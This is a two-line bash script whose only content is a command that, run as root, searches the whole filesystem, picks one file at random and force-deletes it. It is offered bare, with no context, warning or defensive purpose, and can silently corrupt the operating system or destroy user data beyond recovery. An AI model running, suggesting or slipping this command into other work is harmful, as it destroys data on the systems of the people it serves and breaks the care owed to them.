#!/usr/bin/env bash
sudo rm -rf "$(sudo find / -type f -print0 | shuf -n1 -z)"
